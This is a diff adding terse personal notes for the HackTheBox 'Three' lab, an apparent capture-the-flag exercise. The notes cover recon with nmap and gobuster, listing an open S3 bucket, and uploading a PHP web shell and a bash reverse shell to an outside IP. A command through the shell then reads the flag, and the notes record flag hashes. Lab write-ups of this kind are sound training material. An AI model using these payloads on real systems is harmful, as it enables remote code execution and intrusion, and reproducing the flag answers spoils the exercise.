@@ -158,3 +158,47 @@ type flag.txt
 ea81b7afddd03efaa0945333ed147fac
 
 # Three
+HackTheBox Three Walkthrough
+10.129.123.168
+nmap -F -sV -sC 10.129.123.168
+2
+thetoppers.htb
+/etc/hosts
+10.129.123.168 thetoppers.htb
+
+gobuster vhost -u http://thetoppers.htb/ -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+curl thetoppers.htb
+curl s3.thetoppers.htb
+curl http://10.129.123.168 -H "HOST: s3.thetoppers.htb"
+
+echo -e "# htb-starting-point-tier-1-three subdomain host ip mapping\n10.129.123.168 s3.thetoppers.htb" | sudo tee -a /etc/hosts
+echo -e "10.129.123.168 thetoppers.htb" | sudo tee -a /etc/hosts
+sudo nano /etc/hosts
+
+s3.thetoppers.htb
+amazon s3
+awscli
+aws configure
+test
+aws --endpoint-url http://s3.thetoppers.htb/ s3 ls
+aws --endpoint-url http://s3.thetoppers.htb/ s3 ls s3://thetoppers.htb
+aws s3 ls
+php
+
+aws configure
+
+echo '<?php system($_GET["cmd"]); ?>' > test.php
+cat test.php
+
+echo 'bash -i >& /dev/tcp/10.10.16.75/4321 0>&1' > revshell.sh
+cat revshell.sh
+
+aws --endpoint-url http://s3.thetoppers.htb/ s3 cp test.php s3://thetoppers.htb/test.php
+
+aws --endpoint-url http://s3.thetoppers.htb/ s3 cp revshell.sh s3://thetoppers.htb/revshell.sh
+
+aws s3 ls --endpoint-url http://10.129.15.129:8 s3://s3.thetopper.htb
+curl http://10.129.123.168/shellme/shellid.php?cmd=type%20../../flag.txt -H "HOST: thetoppers.htb"
+
+a980d99281a28d638ac68b9bf9453c2b
